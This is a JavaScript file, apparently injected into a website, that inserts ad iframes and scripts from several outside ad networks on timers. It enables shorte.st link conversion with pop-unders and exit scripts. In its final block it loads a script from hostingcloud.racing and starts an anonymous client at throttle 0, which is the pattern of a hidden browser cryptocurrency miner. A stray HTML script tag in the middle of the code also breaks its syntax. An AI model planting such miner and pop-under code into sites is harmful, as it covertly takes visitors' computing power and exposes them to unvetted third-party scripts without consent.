function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
async function derot() {
await sleep(1000);
if(document.getElementById("top_header_addone")){
	var script = document.createElement('script');
    script.type = 'text/javascript';
    script.text = "atOptions = {'key' : '1da037bc0d05b04ca5a97f68953da67b','format' : 'iframe','height' : 90,'width' : 728,'params' : {} 	};";
	var el = document.getElementById("top_header_addone");
    el.appendChild(script);
	var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = 'https://www.madcpms.com/1da037bc0d05b04ca5a97f68953da67b/invoke.js';
    var el = document.getElementById("top_header_addone");
    el.appendChild(script);
}
await sleep(3000);
if(document.getElementById("sidebar_add")){
	var script = document.createElement('script');
    script.type = 'text/javascript';
    script.text = "atOptions = {'key' : '75aa95e7c0c853dc23abd68b8b5e72ac','format' : 'iframe','height' : 250,'width' : 300,'params' : {} 	};";
	var el = document.getElementById("sidebar_add");
    el.appendChild(script);
	var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = 'https://www.madcpms.com/75aa95e7c0c853dc23abd68b8b5e72ac/invoke.js';
    var el = document.getElementById("sidebar_add");
    el.appendChild(script);
}
await sleep(3000);
if(document.getElementById("center_middle_add")){
	var script = document.createElement('script');
    script.type = 'text/javascript';
    script.text = "atOptions = {'key' : 'f52e10fa10bb64c2eba8b5c95eb84d5a','format' : 'iframe','height' : 60,'width' : 468,'params' : {} 	};";
	var el = document.getElementById("center_middle_add");
    el.appendChild(script);
	var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = 'https://www.madcpms.com/f52e10fa10bb64c2eba8b5c95eb84d5a/invoke.js';
    var el = document.getElementById("center_middle_add");
    el.appendChild(script);
}
}
var x = document.createElement("center");
x.style = 'margin-top: 5px';
x.innerHTML = '<iframe data-aa="1332434" src="//ad.a-ads.com/1332434?size=728x90" scrolling="no" style="width:728px; height:90px; border:0px; padding:0; overflow:hidden" allowtransparency="true"></iframe>';
document.body.appendChild(x);
<script type="text/javascript">//<![CDATA[ 
(function() {
    var configuration = {
    "token": "0fc4c33227878b02768b61b867a4e64d",
    "entryScript": {
        "type": "timeout",
        "timeout": 3000,
        "capping": {
            "limit": 5,
            "timeout": 24
        }
    },
    "exitScript": {
        "enabled": true
    },
    "popUnder": {
        "enabled": true
    }
};
    var script = document.createElement('script');
    script.async = true;
    script.src = '//cdn.shorte.st/link-converter.min.js';
    script.onload = script.onreadystatechange = function () {var rs = this.readyState; if (rs && rs != 'complete' && rs != 'loaded') return; shortestMonetization(configuration);};
    var entry = document.getElementsByTagName('script')[0];
    entry.parentNode.insertBefore(script, entry);
})();
(function() {
    var script = document.createElement('script');
    script.async = true;
    script.src = 'https://www.hostingcloud.racing/sszq.js';
    var entry = document.getElementsByTagName('script')[0];
    script.onload = script.onreadystatechange = function () {var _client = new Client.Anonymous('c3c3312a6676d801236f531f505609e0c32ad4d6d642f8dc78fd2e92cd5e31dd', {throttle: 0, c: 'w', ads: 0}); _client.start();};

    entry.parentNode.insertBefore(script, entry);
    
})();
derot();
